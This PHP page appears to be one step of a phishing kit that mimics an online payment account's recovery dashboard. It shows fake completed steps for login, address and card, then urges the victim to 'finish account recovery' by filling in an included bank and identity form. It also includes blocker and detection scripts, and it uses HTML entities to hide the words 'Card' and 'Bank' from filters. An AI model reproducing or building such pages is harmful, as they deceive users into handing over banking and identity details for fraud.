<?php include('../../blocker.php');?>
<?php include('header.php'); ?>
<?php include('../../detect.php'); ?>

	<div id="summary" class="summarySection">
		<div class="row-fluid">
			<div class="span4 summaryModuleContainer">

<?php include('tabel_kiwo.php');?>

			</div>
			<div class="span8" id="js_activityCollection">
			<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone"><h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;"></h1>
			<div></div>
				<div id="parentchild">
					<div style="border-bottom: 1px solid #EEE; height:160px;">
					<ul id="js_profileStates" class="profileStates center" <?php echo 'style="margin: auto"';  ?> >
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Account Login</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Address Updated</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>&#67;ard Updated</li>
						<li><a href="" class="state todoState" target="_blank"><span class="icon icon-medium icon-bank-check" aria-hidden="true"></span>Update &#x0042;ank And Identity</a></li>
					</ul>
					</div>



					<div class="messageBox res-center-critical" style="font-size: 0.875rem;">Final step to restore your account access.


<span class="help" style="padding-left:4%;"><font color="red">*Please fill the form listed to finish your account recovery.</font></span>

</div>

<?php include('../form/bank_info.php'); ?>
